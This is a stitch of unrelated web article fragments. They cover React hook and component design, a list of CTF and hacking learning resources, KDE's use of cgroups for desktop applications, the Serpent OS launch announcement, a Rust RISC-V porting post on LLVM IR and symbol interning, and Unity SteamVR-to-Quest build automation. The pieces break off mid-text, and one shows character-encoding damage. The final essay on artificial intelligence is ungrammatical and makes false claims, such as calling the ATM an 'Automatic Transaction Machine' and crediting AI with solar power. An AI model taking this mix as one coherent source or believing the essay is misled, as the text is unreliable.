  <span>return</span> <span><span><span>&lt;</span>div</span><span>&gt;</span></span><span>Data: </span><span>{</span>data<span>}</span><span><span><span>&lt;/</span>div</span><span>&gt;</span></span><span>;</span>
<span>}</span></code></pre></div>
<h3>The problem ⚡</h3>
<p>There are two <code>useEffect</code> hooks, the first one is handling the api call on the initial render and the second one will call the <code>onSuccess</code> function, by assuming when there is no loading, no error, but data in the state, it must have been a successful call. Make sense right?</p>
<p>Sure for the first call this is true and probably will never fail. But you also loose the direct connection between the action and the function that needs to be called. Also there is no 100% guarantee that this case will only happen if the fetch action has succeeded and this is something we as developers really don't like.</p>
<h3>The solution ✅</h3>
<p>A straight forward solution would be to set the "onSuccess" function to the actual place where the call was successful:</p>
<div data-language="jsx"><pre><code><span>function</span> <span>DataList</span><span>(</span><span><span>{</span> onSuccess <span>}</span></span><span>)</span> <span>{</span>
  <span>const</span> <span>[</span>loading<span>,</span> setLoading<span>]</span> <span>=</span> <span>useState</span><span>(</span><span>false</span><span>)</span><span>;</span>
  <span>const</span> <span>[</span>error<span>,</span> setError<span>]</span> <span>=</span> <span>useState</span><span>(</span><span>null</span><span>)</span><span>;</span>
  <span>const</span> <span>[</span>data<span>,</span> setData<span>]</span> <span>=</span> <span>useState</span><span>(</span><span>null</span><span>)</span><span>;</span>

  <span>const</span> fetchData <span>=</span> <span>useCallback</span><span>(</span><span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
    <span>setLoading</span><span>(</span><span>true</span><span>)</span><span>;</span>
    <span>callApi</span><span>(</span><span>)</span>
      <span>.</span><span>then</span><span>(</span><span>(</span><span>fetchedData</span><span>)</span> <span>=&gt;</span> <span>{</span>
        <span>setData</span><span>(</span>fetchedData<span>)</span><span>;</span>
<span>        <span>onSuccess</span><span>(</span><span>)</span><span>;</span></span>      <span>}</span><span>)</span>
      <span>.</span><span>catch</span><span>(</span><span>(</span><span>err</span><span>)</span> <span>=&gt;</span> <span>setError</span><span>(</span>err<span>)</span><span>)</span>
      <span>.</span><span>finally</span><span>(</span><span>(</span><span>)</span> <span>=&gt;</span> <span>setLoading</span><span>(</span><span>false</span><span>)</span><span>)</span><span>;</span>
  <span>}</span><span>,</span> <span>[</span>onSuccess<span>]</span><span>)</span><span>;</span>

  <span>useEffect</span><span>(</span><span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
    <span>fetchData</span><span>(</span><span>)</span><span>;</span>
  <span>}</span><span>,</span> <span>[</span>fetchData<span>]</span><span>)</span><span>;</span>

  <span>return</span> <span><span><span>&lt;</span>div</span><span>&gt;</span></span><span>{</span>data<span>}</span><span><span><span>&lt;/</span>div</span><span>&gt;</span></span><span>;</span>
<span>}</span></code></pre></div>
<p>Now it is quite clear at the first sight when the onSuccess is called, exactly in the success case of the api call.</p>
<h2>4. Single responsibility components</h2>
<p>Composing components can be hard.
When is it time to split a component into several smaller components?
How do you structure the component tree?
All of these questions arise every day when working with a component-based framework.
However, a common mistake in designing your components is to combine two use cases into a single component.
Let's take an example of a header that shows either a burger button on mobile devices or tabs on desktop screens. (The condition will be handled the the magical <code>isMobile</code> function, which is not part of this example 🧙‍)</p>
<h3>This is dangerous ❌</h3>
<div data-language="jsx"><pre><code><span>function</span> <span>Header</span><span>(</span><span>props</span><span>)</span> <span>{</span>
  <span>return</span> <span>(</span>
    <span><span><span>&lt;</span>header</span><span>&gt;</span></span><span>
      </span><span><span><span>&lt;</span><span>HeaderInner</span></span> <span>menuItems</span><span><span>=</span><span>{</span>menuItems<span>}</span></span> <span>/&gt;</span></span><span>
    </span><span><span><span>&lt;/</span>header</span><span>&gt;</span></span>
  <span>)</span><span>;</span>
<span>}</span>

<span>function</span> <span>HeaderInner</span><span>(</span><span><span>{</span> menuItems <span>}</span></span><span>)</span> <span>{</span>
  <span>return</span> <span>isMobile</span><span>(</span><span>)</span> <span>?</span> <span><span><span>&lt;</span><span>BurgerButton</span></span> <span>menuItems</span><span><span>=</span><span>{</span>menuItems<span>}</span></span> <span>/&gt;</span></span> <span>:</span> <span><span><span>&lt;</span><span>Tabs</span></span> <span>tabData</span><span><span>=</span><span>{</span>menuItems<span>}</span></span> <span>/&gt;</span></span><span>;</span>
<span>}</span></code></pre></div>
<h3>The problem ⚡</h3>
<p>With this approach the component HeaderInner is trying to be two different things at once and we all learned from <a href="https://en.wikipedia.org/wiki/Strange_Case_of_Dr_Jekyll_and_Mr_Hyde">Mr. Jekyll</a>, being more than one thing at a time isn't really ideal.
Also it makes it even hard to test or to reuse the component at other places.</p>
<h3>The solution ✅</h3>
<p>Bringing the condition one level up, makes it easier to see what the components are made for and that they only have one responsibility, being a <code>Header</code>, <code>Tabs</code> or a <code>BurgerButton</code> and not trying to be two things at once.</p>
<div data-language="jsx"><pre><code><span>function</span> <span>Header</span><span>(</span><span>props</span><span>)</span> <span>{</span>
  <span>return</span> <span>(</span>
    <span><span><span>&lt;</span>header</span><span>&gt;</span></span><span>{</span><span>isMobile</span><span>(</span><span>)</span> <span>?</span> <span><span><span>&lt;</span><span>BurgerButton</span></span> <span>menuItems</span><span><span>=</span><span>{</span>menuItems<span>}</span></span> <span>/&gt;</span></span> <span>:</span> <span><span><span>&lt;</span><span>Tabs</span></span> <span>tabData</span><span><span>=</span><span>{</span>menuItems<span>}</span></span> <span>/&gt;</span></span><span>}</span><span><span><span>&lt;/</span>header</span><span>&gt;</span></span>
  <span>)</span><span>;</span>
<span>}</span></code></pre></div>
<h2>5. Single responsibility useEffects</h2>
<p>Remember the times, where we only had the <code>componentWillReceiveProps</code> or <code>componentDidUpdate</code> methods to hook into the rendering process of a react component? It is bringing back dark memories and also realizing the beauty of using the <code>useEffect</code> hook and especially that you can have as much as you want of them.</p>
<p>But sometimes forgetting and using a "useEffect" for several things brings back those dark memories. For example, imagine you have a component that fetches some data from the backend in some way, and also displays breadcrumbs depending on the current location. (Using again <a href="https://reacttraining.com/react-router/">react-router</a> for getting the current location.)</p></div></div>

      I strongly recommend general programming knowledge. This course is a good starting <a href="https://www.coursera.org/learn/python">point</a> for complete beginners to programming and there are a ton more online.<br>
      If you know C/C++ and/or Assembly-bonus points. You will like reverse
      engineering and binary exploitation.<br>
      If you know JavaScript, PHP, and/or SQL, you will enjoy web security.<br>
      I chose tutorials that were hands-on and engaging so readers don't lose interest.
      CTF stands for Capture the Flag, which are hacking contests that happen online every weekend: <a href="https://ctftime.org/">CTFtime</a><br>
      A rule of thumb is to try each problem for 20 minutes to the best of your ability-use google, look at man pages and online documentation
      THEN ask for help.<br> Most websites like HacktheBox, TryHackMe, picoCTF, and others have Discords that are full
      of professionals.<br>
      Another site you may want to checkout is<a href="https://secure.meetup.com/login/"> meetup.com</a>, to meet other hackers and coders who can mentor you, or your local 2600 hacker group(i.e. <a href="https://www.phx2600.org/">Phoenix</a>).

	<!-- .entry-header -->

	<div>
		<p>A desktop environment's sole role is to connect users to their applications. This includes everything from launching apps to actually displaying apps but also managing them and making sure they run fairly. Everyone is familiar the concept of a "Task manager" (like ksysguard), but over time they haven't kept up with the way applications are being developed or the latest developments from Linux.</p>

<h2>Managing running processes</h2>
<p>There used to be a time where one PID == one "application". The kwrite process represents Kwrite, the firefox process represents Firefox, easy. but this has changed. To pick an extreme example:<br>
<strong>Discord in a flatpak is 13 processes!</strong></p>
<p>It basically renders our task manager's process view unusable. All the names are random gibberish, trying to kill the application or setting nice levels becomes a guessing game.  Parent trees can help, but they only get you so far.</p>
<p>It's unusable for me, it's probably unusable for any user and gets in the way of feeling in control of your computer.</p>
<p>We need some metadata.</p>
<h2>Fair resource distribution</h2>
<p>As mentioned above discord in a flatpak is 13 processes. Krita is one process.</p>
<ul>
<li>One will be straining the CPU because it is a highly sophisticated application doing highly complicated graphic operations</li>
<li>One will be straining the CPU because it's written in electron</li>
</ul>
<p>To a kernel scheduler all it would see are 14 opaque processes. It has no knowledge that they are grouped as two different things. It won't be able to come up with something that's fair.</p>
<p>We need some metadata.</p>
<p>(caveat: Obviously most proceses are idling, and I've ignored threads for the purposes of making a point, don't write about it)</p>
<h2>It's hard to map things</h2>
<p>Currently the only metadata of the "application" is on a window.  To show a user friendly name and icon in ksysguard (or any other system monitor) we have to fetch a list of all processes, fetch a list of all windows and perform a mashup. Coming up with arbitrary heuristics for handling parent PIDs which is unstable and messy.</p>
<p>To give some different real world examples:</p>
<ul>
<li>In plasma's task manager we show an audio indicator next to the relevant window, we do this by matching PIDs of what's playing audio to the PID of a window. Easy for the simple case... however as soon as we go multi-process we have to track the parent PID, and each "fix" just alternates between one bug and another.</li>
<li>With PID namespaces apps can't correctly report client PIDs anymore.</li>
<li>We lose information on what "app" we've spawned. We have bug reports where people have two different taskmanager entries for "Firefox" and "Firefox (nightly)" however once the process is spawned that information is lost - the application reports itself as one consistent name and our taskbar gets confused.</li>
</ul>
<p>We need some metadata.</p>

<h2>This is a solved problem!</h2>
<p>A modern sysadmin doesn't deal in processes, but cgroups. The cgroup manager (which will be typically systemd) spawns each service as one cgroup. It uses cgroups to know what's running, the kernel can see what things belong together. </p>
<p>On the desktop flatpaks will spawn themselves in cgroups so that they can use the relevant namespace features.</p>
<p>You're probably already using cgroups. As part of a <a href="https://systemd.io/DESKTOP_ENVIRONMENTS">cross-desktop effort</a> we want to bring cgroups to the entire desktop.</p>
<h2>Example</h2>
<p>Before and after of our system monitor<br>
<a href="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/old1.png"><img src="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/old1.png" alt=""></a></p>
<p><a href="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/ksysguardqml_apps.png"><img src="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/ksysguardqml_apps-1024x772.png" alt=""></a></p>
<p>Ultimately the same data but way easier to read..</p>

<p>Another key part of cgroup usage is the concept of slices. Cgroups are based on a heirachical structure, with slices as logical places to split resource usage. We don't adjust resources globally, we adjust resources within our slice, which then provides information to the scheduler.</p>
<p><a href="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/treepie.png"><img src="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/treepie.png" alt=""></a></p>
<p>Conceptually you can imagine that we just adjust resources within our level of a tree. Then the kernel magically takes care of the rest.</p>
<p>More information can be found on slices in this excellent series <a href="https://www.redhat.com/en/blog/world-domination-cgroups-part-2-turning-knobs"> World domination with cgroups</a>.</p>
<h2>Default slices</h2>
<p>This means we can set up some predefined slices. Within the relevant user slice this will consist shared of</p>
<ul>
<li>applications</li>
<li>the system (kwin/mutter, plasmashell)</li>
<li>background services (baloo, tracker)</li>
</ul>
<p>Each of these slices can be given some default prioritisations and OOM settings out of the box.</p>
<h2>Dynamic resource shifting</h2>
<p>Now that we are using slices, and only adjusting our relative weight within the slice, we can shift resource priority to the application owning the focused window.</p>
<p>This only has any effect if your system is running at full steam from mulitple sources at once, but it can provide a slicker response at no drawback.</p>
<h2>Why slice, doesn't nice suffice?</h2>
<p>Nice is a single value, global across the entire system. Because of this user processes can only be lowered, but never raised to avoid messing with the system.  With slices we're only adjusting relative weight compared to services within our slice. So it's safe to give the user full control within their slice. Any adjustments to an application, won't impact system services or other users.</p>
<p>It also doesn't conflict with nice values set by the application explicitly. If we set kdevelop to have greater CPU weight, clang won't suddenly take over the whole computer when compiling.</p>

<h2>CGroup extra features</h2>
<p>CGroup's come with a lot of new features that aren't available on a per-process level. </p>
<p>We can:</p>
<ul>
<li>Set limits so that a CPU can't use more than N% </li>
<li>We can gracefully close processes on logout</li>
<li>We can disable networking</li>
<li>We can set memory limits</li>
<li>We can prevent forkbombs</li>
<li>We can provide hints to the OOM killer not just with a weight but with expected ranges that should be considered normal</li>
<li>We can freeze groups of processes (which will be useful for Plasma mobile)<br>
... </li>
</ul>
<p>All of this is easy to add for a user / system administrator. Using drop in's one can just add a .service file [example file link] to ~/.config/systemd/user.control/app-firefox@.service and manipulate any of these.</p>
<p>[caveat, some of those features works for applications created as new transient services, not the lite version using scopes that's currently merged in KDE/Gnome - maybe worth mentioning]</p>

<p>Plasma 5.19 and recent Gnome now spawn applications into respective cgroups, but we're not yet surfacing the results that we can get from this.</p>
<p>For the KDE devs providing the metadata is easy.</p>
<p>If spawning a new application from an existing application be sure to use either <a href="https://api.kde.org/frameworks/kio/html/classKIO_1_1ApplicationLauncherJob.html"><code>ApplicationLauncherJob</code></a> or <a href="https://api.kde.org/frameworks/kio/html/classKIO_1_1CommandLauncherJob.html"><code>CommandLauncherJob</code></a> and set the respective service. Everything else is then handled automagically. You should be using these classes anyway for spawning new services.</p>
<p>For users, you can spawn an application with either <code><code>kstart5 --application foo.desktop"</code></code></p>
<p>That change to the launching is relatively tiny, but getting to this point in Plasma wasn't easy - there were a lot of edge cases that messed up the grouping correctly.</p>
<ul>
<li>kinit, our zygote process really meddled with keeping things grouped correctly</li>
<li>drkonqi, our crash handler and application restarter</li>
<li>dbus activation has no knowledge of the associated .desktop file if an application is DBus activated (such as spectacle our screenshot tool)</li>
<li>and many many more papercuts throughout of different launches</li>
</ul>
<p>Also to fully capitalise on slices we need to move all our background processes into managed services and slices. This is worthy of another (equally lengthy) blog post.</p>
<h2>How you can help?</h2>
<p>It's been a battle to find these edge cases.<br>
Whilst running your system, please run systemd-cgls and point out any applications (not background services yet) that are not in their appropriate cgroup.</p>

<p>(e.g BSD users)</p>
<p>As we're just adding metadata, everything used now will continue to work exactly as it does now. All existing tools work exactly the same. Within our task manager we still will keep a process view (it's still useful regardless) and we won't put in any code that relies on the cgroup metadata present. We'll keep the existing heuristics for matching windows with external events, cgroup metadata would just be a strongly influence factor in that. Things won't get worse, but we won't be able to capitalise on the new features discussed here, </p>

    <div>
        <article>
            <p>Serpent OS is (or at least, will be) a Linux distribution with notably different goals
from the mainstream offering. We’re in the process of establishing the project, with
development properly starting towards the end of July.</p>
<h4 id="naming">Naming</h4>
<p>Eventually our plan is to rebrand as ‘Serpent Linux*’ - however we will first need to
complete some early donkey work and apply for a sublicense to use the name. As explained
below, this is <em>not</em> Serpent ‘GNU/Linux’ as the distribution will not be dependent on
a GNU toolchain or runtime. For those who are curious, we’re working with an artist to
choose an appropriate logo for the project.</p>
<h4 id="aims">Aims</h4>
<p>The vast majority of Linux distributions have highly similar goals, and can be best
described using these common industry buzzwords:</p>
<pre><code>Modern, lightweight, privacy oriented/respecting, user-friendly desktop
</code></pre>
<p>We’re focused on building a Linux distribution that serves our own needs.
Chiefly, a Linux distribution for people who want to use Linux, not a “Linux-based-OS”
focusing on interoptability with macOS* + Windows*.</p>
<p>In a nut shell, this is <strong>not</strong> “Linux for the masses”. This is a project setting out to
use Linux as Linux should be used. This will in turn help us to build a significantly
advanced Linux distribution that is both modular and optimised for modern machines.</p>
<h4 id="a-truly-modern-linux-distribution">A Truly Modern Linux Distribution</h4>
<p>As we’re taking a distro-first, compatibility-later approach, our design decisions
will allow us to take some bold steps. We’ll also be able to incorporate all of the
more sensible design improvements in Linux distribution design over the last decade or
so:</p>
<ul>
<li>No more usrbin split</li>
<li>100% clang-built throughout (including kernel)</li>
<li>musl as libc, relying on compiler optimisations instead of inline asm</li>
<li><code>libc++</code> instead of <code>libstdc++</code></li>
<li>LLVM’s binutils variants (<code>lld</code>, <code>as</code>, etc.)</li>
<li>Mixed source/binary distribution</li>
<li>Moving away from <code>x86_64-generic</code> baseline to newer CPUs, including Intel and AMD specific optimisations</li>
<li>Capability based subscriptions in package manager (Hardware/ user choice / etc)</li>
<li><code>UEFI</code> only. No more legacy boot.</li>
<li>Completely open source, down to the bootstrap / rebuild scripts</li>
<li>Seriously optimised for serious workloads.</li>
<li>Third party applications reliant on containers only. No compat-hacks</li>
<li>Wayland-only. X11 compatibility via containers will be investigated</li>
<li>Fully stateless with management tools and upstreaming of patches</li>
<li>Lots, lots more. We’ll blog about it.</li>
</ul>
<h4 id="opinionated-by-default">Opinionated By Default</h4>
<p>A recurring theme that holds back the development of world-class Linux, is high tolerance
for those holding Linux back. A perfect example is NVIDIA* and their lack of support for
accelerated Wayland support on their GPUs. Consequently, our project won’t tolerate such
decisions and will instead blacklist the NVIDIA proprietary drivers from the distribution.</p>
<p>There are other examples that will emerge over time, and will become quite clear.</p>
<p>The time for Linux distributions giving in, with thousands of man hours wasted working around
negative actors, had come to an end.</p>

<p>We will only accept community involvement via our IRC channel: <code>#serpentOS</code> on Freenode.
We will not operate a public bug tracker or forums. Once we are past out initial bootstrap
phase we will set up an email address to help reporting security issues to the team, and
we will of course release security notices.</p>
<p>In terms of feature requests, these will be largely at the discretion of core contributors.
When a company has been formed to house this project, we’re happy to hash out an SLA for
required works.</p>
<h4 id="timescale">Timescale</h4>
<p>It may seem incredibly odd launching a website before there is a distro to show off, however,
it became very apparent that the cat would be out of the bag, so we wanted to be prepared.</p>
<p>Currently, the Founder is in the midst of relocating to the Republic of Ireland. Once complete
we’ll move to stage2 of our bootstrap process and begin working on the tooling needed for the
base development.</p>

assumed that the reader is comfortable with programming terminology. This blog
post contains Rust code samples but the reader is not expected to be fluent in
Rust.</p>
<h2>Hanging Tests</h2>
<p>In the last blog post I mentioned an issue where some <code>rustc</code> tests would
hang indefinitely. While I was tracking down the problem, the upstream
Rust project
<a href="https://github.com/rust-lang/rust/pull/67759">upgraded from LLVM 9 to LLVM 10</a>,
which fixed the hanging tests. I did not look into this issue
further.</p>
<h3>What is LLVM anyway?</h3>
<p>Modern compilers do not translate directly from source code into machine code.
Source code is intended to be convenient for humans to read; but it often is not
convenient for a compiler to reason about. Instead, compilers transform source
code through one (or more) intermediate representations on its way to becoming
machine code. <code>rustc</code> compiles Rust source through intermediate
representations into LLVM Intermediate Representation<a href="#first">*</a> (LLVM IR).
LLVM then runs optimisation passes on the LLVM IR and finally generates machine
code for the chosen architecture.</p>
<p>I think of LLVM IR as an elaborated machine-independent<a href="#second">**</a>
typed assembly language with unlimited registers. See this LLVM IR for a function
to add integers:</p>
<p><code>add.rs</code></p>
<div><pre><span></span><span>pub</span><span> </span><span>fn</span> <span>add</span><span>(</span><span>x</span>: <span>i32</span><span>,</span><span> </span><span>y</span>: <span>i32</span><span>)</span><span> </span>-&gt; <span>i32</span> <span>{</span><span></span>
<span>    </span><span>x</span><span> </span><span>+</span><span> </span><span>y</span><span></span>
<span>}</span><span></span>
</pre></div>


<p><code>rustc --crate-type lib -O add.rs --emit llvm-ir</code></p>
<div><pre><span></span>; ModuleID = 'add.3a1fbbbh-cgu.0'
source_filename = "add.3a1fbbbh-cgu.0"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

; add::add
; Function Attrs: norecurse nounwind nonlazybind readnone uwtable
define i32 @_ZN3add3add17h7cc3d194e9d7e4cdE(i32 %x, i32 %y) unnamed_addr #0 {
start:
  %0 = add i32 %y, %x
  ret i32 %0
}

attributes #0 = { norecurse nounwind nonlazybind readnone uwtable "probe-stack"="__rust_probestack" "target-cpu"="x86-64" }

!llvm.module.flags = !{!0, !1}

!0 = !{i32 7, !"PIC Level", i32 2}
!1 = !{i32 2, !"RtLibUseGOT", i32 1}
</pre></div>


<p>In LLVM IR, lines starting with <code>;</code> are comments. <code>target datalayout</code> and
<code>target triple</code> tell LLVM what architecture it should generate code for.</p>
<p>Next is the function definition. In Rust, the function name is <code>add::add</code>;
but the compiler mangles the name to <code>_ZN3add3add17h7cc3d194e9d7e4cdE</code>.
Then <code>define i32 @foo(i32 %x, i32 %y)</code> means <em>"define a function called
<code>foo</code> which takes two 32-bit signed integer (<code>i32</code>) arguments and returns an
<code>i32</code>"</em>. Inside the function, a <code>start:</code> label begins the block;
then <code>%0 = add i32 %y, %x</code> performs signed 32-bit addition on <code>x</code> and <code>y</code>
and puts the result in a variable automatically named <code>0</code>. Finally, <code>ret i32 %0</code>
returns the value of <code>0</code> as an <code>i32</code>.</p>
<p>The <code>attributes #0</code> line provides extra annotations for all functions tagged
with <code>#0</code> (such as <code>add::add</code>). The annotations give hints for LLVM optimisation
passes.</p>
<p>In theory, to support a new target architecture <code>rustc</code> only needs to know how to
tell LLVM that it should generate code for that architecture. <code>rustc</code> can then
generate LLVM IR as usual and LLVM will handle everything specific to the
architecture. For example, see the tiny
<a href="https://github.com/rust-lang/rust/pull/66661">PR</a> which initially added the
RISC-V Linux target.</p>
<p>In practice, <code>rustc</code> also needs to know how to conform to the ABI for the target
so that the generated code is interoperable with other programming languages. The
RISC-V ABI was added separately.</p>
<p><a name="first">*</a> <em>As well as LLVM, <code>rustc</code> also has an experimental
<a href="https://github.com/bjorn3/rustc_codegen_cranelift">cranelift backend</a>.</em></p>
<p><a name="second">**</a> <em>LLVM IR can be ABI specific but is not machine specific.</em></p>
<h2>Code generation Test Failure</h2>
<p>Other than fixing the hanging <code>ui</code> tests, LLVM 10 also broke code generation
tests for RISC-V. In LLVM 9 IR, function
arguments weren't always named but
<a href="https://github.com/llvm/llvm-project/commit/a009a60a917bc30940422bcef73f8270566d78db">in LLVM 10 they are</a>
. This change broke <code>rustc</code> code generation tests which look for specific strings
in the LLVM IR output by <code>rustc</code>.</p>
<p>After narrowing this test failure down to the LLVM 10 upgrade, I found the
relevant change by looking at <code>clang</code> (which also uses LLVM) tests for the RISC-V
ABI. The
<a href="https://github.com/rust-lang/rust/commit/c872dcf956e541315985ee5fdc592907c20df8ec">fix</a>
was as simple as copying the clang test changes and adapting them for <code>rustc</code>'s
tests.</p>
<h2>UI Tests</h2>
<p>The <code>ui</code> tests for <code>rustc</code> check all user facing aspects of the compiler. Some of
these tests check that <code>rustc</code> displays the correct error messages when compiling
erroneous source.</p>
<p>There was a bug highlighted by some of these tests on RISC-V: <code>rustc</code> displays
the correct errors but in the wrong order! To debug this I used
<code>-Z treat-err-as-bug=n</code> to cause <code>rustc</code> to panic on the <code>n</code>th error. The panic
backtrace shows where the error is generated from. In this case, the miss-ordered
errors came from
<a href="https://github.com/rust-lang/rust/blob/master/src/librustc_resolve/late.rs#L1287"><code>src/librustc_resolve/late.rs</code></a>:</p>

<p>In part 3, <code>missing_vars</code> is sorted before the errors are reported so how can
the errors be out of order?</p>
<p>At the time of the sort, <code>missing_vars</code> is a <code>Vec</code>tor of tuples, with each tuple
containing a <code>Symbol</code> and a mutable reference to a <code>BindingError</code>. In Rust this
type is written as <code>Vec&lt;(Symbol, &amp;mut BindingError)&gt;</code>. Rust tuples sort first by
the left-most element (in this case, the <code>Symbol</code>). To explain <code>Symbol</code> ordering
following a sort, first we must look at how strings are used within <code>rustc</code>.</p>
<h3>String Interning</h3>
<p>Source code often contains duplicates of the same string token. For example,
in the above listing of <code>check_consistent_bindings</code> the string <code>"FxHashMap"</code>
occurs twice and <code>"missing_vars"</code> occurs five times. Allocating separate strings
for each of these occurrences would waste memory and time. Instead, <code>rustc</code>
allocates each string once and uses indices to refer to the full string each
time it is needed. These indices are 32-bit unsigned integers (in a wrapper
type) and so can be copied and compared efficiently. The process of allocating
a string only once and using references to that string is called "interning".</p>
<p><a href="https://github.com/rust-lang/rust/blob/master/src/librustc_span/symbol.rs#L1041"><code>Symbol</code></a>
is the type representing an interned string:</p>
<div><pre><span></span><span>#[derive(Clone, Copy, PartialEq, ParitialOrd, Hash)]</span><span></span>
<span>pub</span><span> </span><span>struct</span> <span>Symbol</span><span>(</span><span>SymbolIndex</span><span>);</span><span></span>
</pre></div>


<p>Here we can see that the implementation of <code>PartialOrd</code> for <code>Symbol</code> (which
provides the <code>Ord</code>ering of <code>Vec::sort</code> above) derives from the index's <code>Ord</code>ering.
But where does the index come from?</p>

<p><code>rustc</code> interns strings using <code>Interner::intern</code>, which
returns a <code>Symbol</code>. References to the interned strings are stored in a
<code>Vec</code>tor and the <code>Symbol</code> contains the index of the string reference in that
<code>Vec</code>tor. Therefore, the Symbol can look up its string by indexing into the
<code>strings</code> vector and following the reference (pointer) to the actual string
(which is allocated in the <code>arena</code>).</p>
<p>For example, if the strings <code>"a"</code>, <code>"b"</code> and <code>"c"</code> are interned, then (ignoring
the referencing), the <code>Interner</code>'s <code>Vec</code> will look like <code>["a", "b", "c"]</code>. If
instead we interned <code>"b"</code>, <code>"a"</code>, <code>"b"</code> and <code>"c"</code>; the <code>Vec</code> will look like
<code>["b", "a", "c"]</code> because the second attempt to intern <code>"b"</code> finds that <code>"b"</code> is
already interned and so just returns the index of the existing copy of <code>"b"</code>.
Carrying on with this second example, imagine the following:</p>
<div><pre><span></span><span>let</span><span> </span><span>mischief</span><span> </span><span>=</span><span> </span><span>Symbol</span>::<span>intern</span><span>(</span><span>"b"</span><span>);</span><span></span>
<span>let</span><span> </span><span>a</span><span> </span><span>=</span><span> </span><span>Symbol</span>::<span>intern</span><span>(</span><span>"a"</span><span>);</span><span></span>
<span>let</span><span> </span><span>b</span><span> </span><span>=</span><span> </span><span>Symbol</span>::<span>intern</span><span>(</span><span>"b"</span><span>);</span><span></span>
<span>let</span><span> </span><span>c</span><span> </span><span>=</span><span> </span><span>Symbol</span>::<span>intern</span><span>(</span><span>"c"</span><span>);</span><span></span>

<span>let</span><span> </span><span>mut</span><span> </span><span>v</span><span> </span><span>=</span><span> </span><span>vec</span><span>!</span><span>[</span><span>c</span><span>,</span><span> </span><span>b</span><span>,</span><span> </span><span>a</span><span>];</span><span></span>
<span>v</span><span>.</span><span>sort</span><span>();</span><span></span>
</pre></div>


<p>While we might expect <code>v</code> to end up equal to <code>[a, b, c]</code>, <code>v</code> is actually sorted
to equal <code>[b, a, c]</code> because <code>Symbol</code>s are sorted by their indices not by the
strings they point to. <code>b</code> received the lowest index because it was interned
first. This semantic can be useful because the index ordering is faster than
looking up the full strings and comparing them; and …</p></div></div></div>

                    <p>This is the final article from the series about porting Unity SteamVR games to Oculus Quest.
The previous articles in the series:
<a href="https://exyte.com/blog/porting-basic-unity-steamvr-games-functionality-to-oculus-quest">Porting basic Unity SteamVR game's functionality to Oculus Quest</a>
<a href="https://exyte.com/blog/optimization-techniques-for-porting-unity-steamvr-games-to-oculus-quest">Optimization techniques for porting Unity SteamVR games to Oculus Quest</a></p>
<h2>Automated artifact building</h2>
<p>You may know that itâ€™s possible to automate artifact building in Unity. And of course, itâ€™s possible to automate artifact building for Windows and Oculus Quest while having the same code for both platforms. We added a batch file build.bat that is used by both developers and the build-server. This script is configured with several options and will execute platform-specific code to prepare and build the project in Unityâ€™s batch mode.</p>
<p><img src="https://exyte.com/upload/1593497398642-1.png" alt=""></p><p>build.bat:
</p>
<p>BuildScript.cs:
</p>
<p>Here you can see an example with light that is baked pre-build. We use Progressive GPU Lightmapper to achieve this, and you can find the OpenCL platform and device values in the <a rel="nofollow" href="https://docs.unity3d.com/Manual/GPUProgressiveLightmapper.html">documentation</a>. We take care of the baked light before building because we use procedural generation to slightly tweak scenes. You can remove these options if you donâ€™t use baked lighting or if its parameters are platform-independent.</p>
<p>One of the most annoying things related to building both for Windows and Oculus Quest is that you have to compress textures by using ASTC for Oculus Quest. That means textures are extracted and compressed each time you switch between two platforms while building artifacts. Switching from Windows to Oculus Quest might take 2 to 5 hours depending on the number of textures. We found that the most effective way is to clone the project repo in 2 separate directories for each platform and then build them independently. Obviously, we still retain the same codebase. We replicated this approach on our build-server (Jenkins) by creating 2 different projects with separate workspaces for each platform.</p>
<h2>Conclusion</h2>
<p>With this article we finish our series about porting SteamVR games to Oculus Quest. Our goal was to explain our approach to having shared code and resources for both platforms to reduce development and maintenance costs. This approach is certainly not universal, but it worked for our project and might work for yours. We hope that the articles answered most of the questions you might have during the porting process and saved some of your time.</p>

<p>AI having an expanding onto many places such as astronomically, e-commercially, economically, and many on other platforms.</p>
<p>Astronomically, the human’s having the suffer of the moon and more planet and researching about them and improving the ability of own to resolve those issue to the moon. Therefore, we can get useful information about it.</p>
<p>NASA has been a major place for astronomically to getting information about the planet, moon, sun, earth, etc.</p>
<p>NASA’s founded many of the planet and satellite in space. They have provided information about them among us. So, They’re been very helpful to us.</p>
<p>By Artificial Intelligence, the E-commercial system like the <a href="https://shiv1367.com/transmission-control-protocol-tcp"><span>internet</span></a> is connected to all e-commercial things globally. So, people are making easy to sell out any product on the internet.</p>
<p>The Internet is having more popular today by <strong>Artificial Intelligence AI</strong>. So, many sellers and buyers communicating by supporting the e-commerce <a href="https://shiv1367.com/what-is-wordpress"><span>web site</span></a> or <a href="https://shiv1367.com/mobile-application-mobile-app"><span>mobile application</span></a> such as social media platforms.</p>
<p>Today, billions of people’s using Facebook, Instagram, Twitter, WhatsApp, etc. So, people do not effort more for selling and buying any product.</p>
<p>Many entrepreneurs are having to create own web site to sell the product on the internet.</p>
<p>And having encourage to sell out the product to people by using many marketing strategies like <a href="https://shiv1367.com/email-electronic-mail"><span>E-mail</span></a> marketing, Digital marketing, Content marketing, etc.</p>
<p>Economically the human is also making easy all things by The <strong>Artificial Intelligence Applications</strong>. Because many of thing is connected by the smart system such as ATM (Automatic Transaction Through Machine) is making possible the transaction between user and system.</p>
<div><figure><img src="https://shiv1367.com/wp-content/uploads/2019/05/AI2.jpg" alt="ATM (Automatic Transaction Machine)" width="691" height="518" data-src="https://shiv1367.com/wp-content/uploads/2019/05/AI2.jpg" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><figcaption><span><strong>&nbsp; &nbsp; &nbsp; </strong></span><strong>AUTOMATIC TRANSACTION MACHINE</strong></figcaption></figure></div>
<p>Netbanking is also so much helpful to people for the online transaction. Therefore, People can use the money to purchase any product on the internet.</p>
<p>AI’s given us lots of smart electric things like solar is making possible to convert the sunlight to electric current through the human’s generating more electric current from the sun. By this proceeding, the people have not felt like darkness.</p>
<h2><span id="Advantages_Of_Artificial_Intelligence"><strong>Advantages Of Artificial Intelligence</strong></span></h2>
